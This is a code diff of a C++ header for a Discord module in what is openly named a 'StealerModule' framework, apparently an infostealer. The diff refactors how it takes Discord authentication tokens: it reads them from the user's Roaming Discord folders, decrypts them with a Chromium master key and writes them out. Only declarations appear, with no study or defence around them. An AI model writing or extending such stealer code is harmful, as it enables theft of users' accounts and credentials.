@@ -9,9 +9,9 @@
 #include <sstream>
 #include <regex>
 #include "json.hpp"
-#include <windows.h>
 
 #include "../../../StealerModule.h"
+#include "../../../../utils/chromuim/ChromuimUtil.h"
 
 using json = nlohmann::json;
 
@@ -19,14 +19,11 @@ class Discord : public StealerModule {
 public:
     void execute(fs::path &root) override;
 private:
-    static std::vector<BYTE> getMaterKey(fs::path &root);
-
     static void writeTokenInfo(const std::string& token, const fs::path& root);
 
     std::vector<std::string> getTokens();
     std::vector<std::string> getToken(fs::path &root);
     static std::vector<std::string> scanToken(fs::path &root, const std::vector<BYTE>& master_key);
-    static std::string decrypt(const std::vector<unsigned char>& buffer, const std::vector<unsigned char>& master_key);
 
     std::vector<fs::path> discord_paths = {
         Utils::getRoamingPath() / "discord",
